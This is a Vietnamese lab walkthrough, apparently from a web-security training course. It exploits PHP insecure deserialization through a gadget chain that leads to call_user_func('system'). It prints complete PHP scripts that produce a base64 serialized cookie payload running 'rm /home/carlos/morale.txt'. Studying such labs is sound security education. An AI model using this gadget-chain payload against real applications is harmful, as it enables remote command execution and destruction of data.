<img width="1552" height="788" alt="image" src="https://github.com/user-attachments/assets/3d4cb279-c4e2-49b1-b102-5971f0b14687" />

Yêu cầu: Xóa file morale.txt từ thư mục home của Carlos.

Thông tin lab cung cấp: lab này sử dụng cơ chế phiên (session) dựa trên quá trình tuần tự hóa (serialization) và do đó dính lỗ hổng tiêm đối tượng tùy ý (arbitrary object injection).

Gợi ý: Đôi khi có thể thêm ~ vào đuôi file để đọc source code.

Account cung cấp: wiener:peter.

<img width="2501" height="1443" alt="image" src="https://github.com/user-attachments/assets/d17ce3fc-4e63-475e-8881-45e96e0557d2" />

Sau khi đăng nhập thành công ta phát hiện ra session cookie được dựa trên serialization và được mã hóa base64.

<img width="2560" height="958" alt="image" src="https://github.com/user-attachments/assets/30a5f04c-a0cc-47f9-9951-639550cb5b0b" />

Và dựa vào gợi ý tôi phát hiện ra 1 file php ẩn ở trên `View Page Source`:

<img width="2504" height="1443" alt="image" src="https://github.com/user-attachments/assets/36e29540-ed1c-4912-a60c-b646ffb4d1b6" />

Và sau khi chèn thêm ~ ở cuối filename thì tôi đọc được source code của file đấy(lí do tôi có thể đọc được source code là do khi dev dùng các trình soạn thảo trên Linux để chỉnh sửa mã thì 
thường tự động sinh ra 1 file backup tệp này tên giống hệt tên tệp gốc nhưng thêm ~ ở cuối).

Nội dung như sau:

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

Ở đây tôi phát hiện 1 hàm khá là nguy hiểm đó là `call_user_func($callback, $parameter)` dùng để gọi và thực thi một hàm khác một cách động (dynamic) thông qua tên hàm viết dưới dạng chuỗi,
với `$callback` là hàm muốn gọi và `$parameter` là tham số muốn truyền vào bên trong `$callback`(1). Và hàm này còn đang được gọi bên trong 1 magic method `__get($name)` thì hàm này sẽ tự 
động gọi khi bạn cố gắng truy cập vào một thuộc tính (property) của đối tượng mà thuộc tính đó:

* Không tồn tại trong đối tượng đó.(2)

* Hoặc thuộc tính đó bị giới hạn quyền truy cập (được khai báo là private hoặc protected) từ bên ngoài class.

--> Và cái thuộc tính đó sẽ được truyền ngược vào trong `__get($var)`.

Và ở đây còn 1 magic_method `__wakeup` nữa thì hàm này tự động gọi ngay tại khoảnh khắc hàm unserialize() thực thi(3) và nó đang gọi tới hàm `build_product` thì hàm này đang tạo 1 Object
Product với 2 tham số và trong class Product thì có dòng code này:

```php
$this->desc = $desc->$default_desc_type;
```

thì biến `$desc` sẽ gọi tới tên biến có giá trị của biến `$default_desc_type`(4). Thì như trong sever là `$default_desc_type` có giá trị là `HTML_DESC` và `$desc` có giá trị là 1 Object
`Description` thì trong đoạn code kia là nó sẽ gọi tới giá trị của biến `$HTML_DESC` trong class `Description` có nội dung là `<p>This product is <blink>SUPER</blink> cool in html</p>`.

Vậy thì ở đây ta sẽ lợi dụng 4 điểm (1)(2)(3)(4) trên đó là:

1. Đầu tiên ta sẽ tạo 1 Object `CustomTemplate` với giá trị `$default_desc_type` = [OS command định chạy] và `$desc` = [Object DefaultMap với giá trị là system].

2. Tiếp theo khi cho vào hàm `unserialize()` thì `__wakeup` được tự động gọi tới và nó sẽ tạo 1 Object `Product`.

3. sau đó đi vào class `Product` thì `Object DefaultMap` ta tạo ở trên được gán vào `$desc` sẽ gọi tới biến có tên là `[OS command định chạy]`(là giá trị được gán vào `$default_desc_type`).

4. Lúc này trong class `DefaultMap` không phát hiện biến nào tên là `[OS command định chạy]` dẫn tới magic method `__get($var)` được gọi và nó trả về output của hàm
`call_user_func($callback, $parameter)` và lúc này hàm `call_user_func($callback, $parameter)` sẽ thành

```php
call_user_func('system', [OS command định chạy])
```

Giờ tôi sẽ bắt đầu tạo payload dựa trên cái flow trên:

```php
<?php

class CustomTemplate
{
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type, $desc) // sửa lại để có thể truyền đủ tham số vào Object
    {
        $this->desc = $desc;
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep()
    {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup()
    {
        $this->build_product();
    }

    private function build_product()
    {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product
{
    public $desc;

    public function __construct($default_desc_type, $desc)
    {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description
{
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct()
    {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap
{
    private $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }

    public function __get($name)
    {
        return call_user_func($this->callback, $name);
    }
}

$defaultMap = new DefaultMap('system');
$CustomTemplate = new CustomTemplate('rm /home/carlos/morale.txt', $defaultMap);

echo base64_encode(serialize($CustomTemplate)); // mã hóa nó lại để tránh bị lỗi thiếu ký tự như các các ký tự mà console không hiển thị được
```

<img width="2123" height="291" alt="image" src="https://github.com/user-attachments/assets/e9c1b4ef-3a60-4ea1-b7f0-d5b8e2a878da" />

Ta được payload ở dưới và sau khi chèn vào cookie và url encode lại thì ta thấy thông báo như dưới

<img width="2563" height="1443" alt="image" src="https://github.com/user-attachments/assets/37fe5f63-c656-451c-9640-000643f59392" />

**(Note: Ở đấy tôi đã test payload trước nên mới in ra lỗi không có file như trên)**

<img width="2508" height="1425" alt="image" src="https://github.com/user-attachments/assets/1aec6f40-ce98-417f-b814-7917ad343e46" />

**Ở đây có thể dùng script này tạo payload trông gọn hơn**:

```php
<?php

class CustomTemplate
{
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type, $desc) // sửa lại để có thể truyền đủ tham số vào Object
    {
        $this->desc = $desc;
        $this->default_desc_type = $desc_type;
    }
}

class DefaultMap
{
    private $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }

    public function __get($name)
    {
        return call_user_func($this->callback, $name);
    }
}

$defaultMap = new DefaultMap('system');
$CustomTemplate = new CustomTemplate('rm /home/carlos/morale.txt', $defaultMap);

echo base64_encode(serialize($CustomTemplate)); // mã hóa nó lại để tránh bị lỗi thiếu ký tự như các các ký tự mà console không hiển thị được
```

Ở đây ta chỉ cần tạo Object thôi không cần tới các method, các biến được hardcode sẵn rồi hay là các class không cần tới nên chỉ cần giữ lại bộ khung các class chứa thuộc tính (properties) 
tham gia trực tiếp vào chuỗi Gadget Chain để serialize() đóng gói dữ liệu là đủ.
